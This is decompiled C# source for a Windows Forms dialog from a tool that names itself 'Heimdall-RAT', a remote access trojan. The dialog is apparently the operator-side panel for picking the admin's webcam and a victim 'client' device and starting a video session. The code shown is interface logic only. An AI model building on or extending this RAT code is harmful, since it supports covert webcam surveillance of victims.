using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class ChatWGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Qu")]
	private TrackBar _Qu;

	[AccessedThroughProperty("StartChattt")]
	private Button _StartChattt;

	[AccessedThroughProperty("CDAW")]
	private ComboBox _CDAW;

	[AccessedThroughProperty("CDCW")]
	private ComboBox _CDCW;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	public string Devices;

	public int Sock;

	public int NOO;

	private VideoCaptureDevice VCD;

	private FilterInfoCollection FIC;

	internal virtual TrackBar Qu
	{
		[DebuggerNonUserCode]
		get
		{
			return _Qu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = q_Scroll;
			if (_Qu != null)
			{
				_Qu.remove_Scroll(eventHandler);
			}
			_Qu = value;
			if (_Qu != null)
			{
				_Qu.add_Scroll(eventHandler);
			}
		}
	}

	internal virtual Button StartChattt
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartChattt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Start_Click;
			if (_StartChattt != null)
			{
				((Control)_StartChattt).remove_Click(eventHandler);
			}
			_StartChattt = value;
			if (_StartChattt != null)
			{
				((Control)_StartChattt).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox CDAW
	{
		[DebuggerNonUserCode]
		get
		{
			return _CDAW;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CDAW = value;
		}
	}

	internal virtual ComboBox CDCW
	{
		[DebuggerNonUserCode]
		get
		{
			return _CDCW;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CDCW = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	public ChatWGR()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)WCV_Load);
		__ENCAddToList(this);
		FIC = new FilterInfoCollection(FilterCategory.VideoInputDevice);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		//IL_0213: Expected O, but got Unknown
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Expected O, but got Unknown
		//IL_030f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Expected O, but got Unknown
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got Unknown
		//IL_0551: Unknown result type (might be due to invalid IL or missing references)
		//IL_055b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ChatWGR));
		Qu = new TrackBar();
		StartChattt = new Button();
		CDAW = new ComboBox();
		CDCW = new ComboBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		((ISupportInitialize)Qu).BeginInit();
		((Control)this).SuspendLayout();
		Qu.set_AutoSize(false);
		TrackBar qu = Qu;
		Point location = new Point(74, 72);
		((Control)qu).set_Location(location);
		Qu.set_Maximum(100);
		((Control)Qu).set_Name("Qu");
		TrackBar qu2 = Qu;
		Size size = new Size(282, 20);
		((Control)qu2).set_Size(size);
		((Control)Qu).set_TabIndex(0);
		((Control)StartChattt).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button startChattt = StartChattt;
		location = new Point(304, 98);
		((Control)startChattt).set_Location(location);
		((Control)StartChattt).set_Name("StartChattt");
		Button startChattt2 = StartChattt;
		size = new Size(102, 23);
		((Control)startChattt2).set_Size(size);
		((Control)StartChattt).set_TabIndex(1);
		((ButtonBase)StartChattt).set_Text("Start");
		((ButtonBase)StartChattt).set_UseVisualStyleBackColor(true);
		CDAW.set_DropDownStyle((ComboBoxStyle)2);
		((Control)CDAW).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)CDAW).set_FormattingEnabled(true);
		ComboBox cDAW = CDAW;
		location = new Point(105, 12);
		((Control)cDAW).set_Location(location);
		((Control)CDAW).set_Name("CDAW");
		ComboBox cDAW2 = CDAW;
		size = new Size(304, 21);
		((Control)cDAW2).set_Size(size);
		((Control)CDAW).set_TabIndex(2);
		CDCW.set_DropDownStyle((ComboBoxStyle)2);
		((Control)CDCW).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)CDCW).set_FormattingEnabled(true);
		ComboBox cDCW = CDCW;
		location = new Point(105, 39);
		((Control)cDCW).set_Location(location);
		((Control)CDCW).set_Name("CDCW");
		ComboBox cDCW2 = CDCW;
		size = new Size(304, 21);
		((Control)cDCW2).set_Size(size);
		((Control)CDCW).set_TabIndex(3);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(6, 15);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(95, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Admin Device :");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(8, 42);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(92, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Client Device :");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label5 = Label3;
		location = new Point(8, 74);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(56, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(6);
		Label3.set_Text("Quality :");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label7 = Label4;
		location = new Point(362, 74);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(44, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(7);
		Label4.set_Text("Label4");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(418, 130);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CDCW);
		((Control)this).get_Controls().Add((Control)(object)CDAW);
		((Control)this).get_Controls().Add((Control)(object)StartChattt);
		((Control)this).get_Controls().Add((Control)(object)Qu);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ChatWGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("WCV");
		((ISupportInitialize)Qu).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void WCV_Load(object sender, EventArgs e)
	{
		Qu.set_Value(30);
		Label4.set_Text("30 %");
		checked
		{
			if (((CollectionBase)(object)FIC).Count == 0)
			{
				CDAW.get_Items().Add((object)"Null");
			}
			else
			{
				int num = (int)Math.Round(Conversions.ToDouble(((CollectionBase)(object)FIC).Count.ToString()) - 1.0);
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					CDAW.get_Items().Add((object)FIC.get_Item(num2).Name.ToString());
					num2++;
					num2 += 0;
				}
			}
			if (Operators.CompareString(Devices, "Null", false) == 0)
			{
				CDCW.get_Items().Add((object)"Null");
				return;
			}
			string[] array = Strings.Split(Devices, "|", -1, (CompareMethod)0);
			int num5 = array.Length - 2;
			int num6 = 0;
			while (true)
			{
				int num7 = num6;
				int num4 = num5;
				if (num7 <= num4)
				{
					CDCW.get_Items().Add((object)array[num6].ToString());
					num6++;
					num6 += 0;
					continue;
				}
				break;
			}
		}
	}

	private void q_Scroll(object sender, EventArgs e)
	{
		Label4.set_Text(Qu.get_Value() + " %");
	}

	private void Start_Click(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(CDAW.get_SelectedItem(), (object)"Null", false))
		{
			MessageBox.Show("You must select your device!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(CDAW.get_SelectedItem(), (object)null, false))
		{
			MessageBox.Show("You must select your device!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(CDCW.get_SelectedItem(), (object)"Null", false))
		{
			MessageBox.Show("You must select client device!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(CDCW.get_SelectedItem(), (object)null, false))
		{
			MessageBox.Show("You must select client device!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if ((Operators.CompareString(CDAW.get_Items().get_Item(CDAW.get_SelectedIndex()).ToString(), "Null", false) == 0) & (Operators.CompareString(CDCW.get_Items().get_Item(CDCW.get_SelectedIndex()).ToString(), "Null", false) == 0))
		{
			MessageBox.Show("You must select your- client device!, you both dont have a cam!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			((Form)this).Close();
			return;
		}
		ChatGR chatGR = (ChatGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + NOO);
		chatGR.Old = chatGR.PictureBox2.get_Image();
		if (Operators.CompareString(CDAW.get_Items().get_Item(CDAW.get_SelectedIndex()).ToString(), "Null", false) != 0)
		{
			((Control)chatGR.Button2).set_Tag((object)"Stop video call");
			((ButtonBase)chatGR.Button2).set_Image((Image)(object)Resources.deletewebcam);
			chatGR.Q = Qu.get_Value();
			chatGR.RC(CDAW.get_SelectedIndex());
		}
		if (Operators.CompareString(CDCW.get_Items().get_Item(CDCW.get_SelectedIndex()).ToString(), "Null", false) == 0)
		{
			((Control)chatGR.Pic).set_Visible(false);
			((Control)chatGR.RCG).set_Dock((DockStyle)5);
		}
		else
		{
			((Control)chatGR.Pic).set_Visible(true);
			((Control)chatGR.RCG).set_Dock((DockStyle)2);
			chatGR.SOO(CDCW.get_SelectedIndex());
		}
		((Form)this).Close();
	}
}
